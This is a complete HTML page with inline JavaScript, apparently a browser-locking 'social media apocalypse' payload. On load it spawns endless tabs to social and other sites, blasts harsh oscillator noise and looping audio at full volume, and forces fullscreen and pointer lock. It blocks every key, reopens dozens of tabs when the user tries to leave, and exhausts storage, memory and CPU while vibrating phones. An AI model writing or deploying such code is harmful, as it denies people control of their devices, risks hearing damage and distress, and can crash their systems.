<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=index.html"> <!-- auto-reload -->
    <title>⛔ COMPROMISED ⛔</title>
    <style>
        * { margin:0; padding:0; }
        body {
            background: #000;
            color: #0ff;
            font: 900 3rem monospace;
            overflow: hidden;
            height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            flex-direction:column;
            user-select:none;
            cursor: none;
        }
        .glitch { animation: glitch 0.03s infinite; text-shadow: 0 0 40px cyan; }
        @keyframes glitch {
            0% { transform: translate(0,0) scale(1); }
            25% { transform: translate(-15px,15px) scale(1.1); }
            50% { transform: translate(15px,-15px) scale(0.9); }
            75% { transform: translate(-8px,8px) scale(1.05); }
            100% { transform: translate(0,0) scale(1); }
        }
        iframe, audio { display: none; }
    </style>
</head>
<body>
    <div class="glitch">🔥 SOCIAL MEDIA OVERLOAD 🔥</div>
    <div style="font-size:1rem;color:#888;">Click anywhere to unleash the tab storm</div>

    <!-- Explicit audio (replace with your own MP3s) -->
    <audio id="explicit1" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
    <audio id="explicit2" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>

    <script>
        (function() {
            // ===== PERSISTENCE =====
            if (!localStorage.getItem('social_apocalypse')) {
                localStorage.setItem('social_apocalypse', 'active');
                location.reload();
            }

            // ===== WEB AUDIO PAIN =====
            let audioCtx = null;
            try {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.value = 2500 + Math.random() * 2000;
                gain.gain.value = 0.8;
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                // Noise
                const bufSize = audioCtx.sampleRate * 0.5;
                const buf = audioCtx.createBuffer(1, bufSize, audioCtx.sampleRate);
                const data = buf.getChannelData(0);
                for (let i=0; i<bufSize; i++) data[i] = Math.random() * 2 - 1;
                const noise = audioCtx.createBufferSource();
                noise.buffer = buf;
                noise.loop = true;
                const ng = audioCtx.createGain();
                ng.gain.value = 0.5;
                noise.connect(ng);
                ng.connect(audioCtx.destination);
                noise.start();
            } catch(e) {}

            // ===== EXPLICIT AUDIO =====
            const audios = [document.getElementById('explicit1'), document.getElementById('explicit2')];
            audios.forEach(a => { a.volume = 1.0; a.play().catch(()=>{}); });
            // Extra dynamic audio elements
            for (let i=0; i<15; i++) {
                const a = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
                a.volume = 1.0;
                a.loop = true;
                a.play().catch(()=>{});
            }

            // ===== FULLSCREEN + POINTER LOCK =====
            const lock = () => {
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    document.documentElement.requestFullscreen?.().catch(()=>{});
                    document.documentElement.webkitRequestFullscreen?.();
                }
                if (!document.pointerLockElement) {
                    document.body.requestPointerLock?.().catch(()=>{});
                }
            };
            setInterval(lock, 50);
            lock();
            document.addEventListener('visibilitychange', lock);
            window.addEventListener('focus', lock);

            // ===== BLOCK ALL EXIT KEYS =====
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopPropagation();
            }, true);
            document.addEventListener('contextmenu', e => e.preventDefault());

            // ===== BEFOREUNLOAD TRAP =====
            window.addEventListener('beforeunload', (e) => {
                e.preventDefault();
                e.returnValue = '';
                for (let i=0; i<100; i++) window.open(location.href, '_blank');
                location.reload();
            });

            // ===== INFINITE HISTORY LOCK =====
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', () => {
                history.pushState(null, null, location.href);
                for (let i=0; i<50; i++) window.open(location.href, '_blank');
            });

            // ===== THE TAB STORM – opens social media sites =====
            const socialSites = [
                'https://www.instagram.com',
                'https://www.facebook.com',
                'https://www.twitter.com',
                'https://www.youtube.com',
                'https://www.reddit.com',
                'https://www.tiktok.com',
                'https://www.snapchat.com',
                'https://www.pinterest.com',
                'https://www.linkedin.com',
                'https://www.whatsapp.com',
                'https://www.telegram.org',
                'https://www.discord.com',
                'https://www.twitch.tv',
                'https://www.spotify.com',
                'https://www.netflix.com',
                'https://www.amazon.com',
                'https://www.google.com',
                'https://www.yahoo.com',
                'https://www.bing.com',
                'https://www.wikipedia.org'
            ];

            let stormActive = false;
            const spawnTabs = () => {
                if (!stormActive) return;
                // Open 30 tabs, each to a random social site
                for (let i=0; i<30; i++) {
                    const url = socialSites[Math.floor(Math.random() * socialSites.length)];
                    const name = 'tab_' + Date.now() + '_' + i + '_' + Math.random();
                    const win = window.open(url, name, 'width=800,height=600,menubar=no,toolbar=no');
                    if (!win) {
                        // Fallback: hidden link click
                        const a = document.createElement('a');
                        a.href = url;
                        a.target = name;
                        a.click();
                    }
                }
            };

            // Start storm on any interaction
            const startStorm = () => {
                if (stormActive) return;
                stormActive = true;
                spawnTabs();
                setInterval(spawnTabs, 200); // every 200ms
                document.addEventListener('mousemove', spawnTabs);
                document.addEventListener('click', spawnTabs);
                document.addEventListener('touchstart', spawnTabs);
                // Also use iframe postMessage to spawn more
                const iframe = document.createElement('iframe');
                iframe.src = 'data:text/html,<script>setInterval(()=>{window.parent.postMessage("spawn","*")},100);<\/script>';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                window.addEventListener('message', (e) => {
                    if (e.data === 'spawn') spawnTabs();
                });
                // Meta refresh to reload constantly
                document.querySelector('meta[http-equiv="refresh"]').content = '1; url=index.html';
            };

            document.addEventListener('click', startStorm);
            setTimeout(startStorm, 1500); // auto-start after 1.5s

            // ===== RESOURCE EXHAUSTION =====
            try {
                let data = 'x'.repeat(1024 * 1024);
                for (let i=0; i<200; i++) localStorage.setItem('junk_'+i, data + Math.random());
            } catch(e) {}
            for (let i=0; i<20000; i++) {
                const div = document.createElement('div');
                div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:2px;height:2px;background:rgb(0,${Math.random()*255},0);border-radius:50%;opacity:0.2;`;
                document.body.appendChild(div);
            }
            setInterval(() => { for(let i=0;i<5000000;i++) Math.sqrt(i); }, 5);

            // ===== MOBILE VIBRATION =====
            if (navigator.vibrate) setInterval(() => navigator.vibrate(1000), 500);

            // ===== WAKE LOCK =====
            if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(()=>{});

            // ===== FOCUS THEFT =====
            setInterval(() => window.focus(), 10);

            console.log('%c🔥 SOCIAL MEDIA APOCALYPSE 🔥', 'font-size:40px;color:cyan;background:black;padding:10px;');
        })();
    </script>  
</body>
</html>
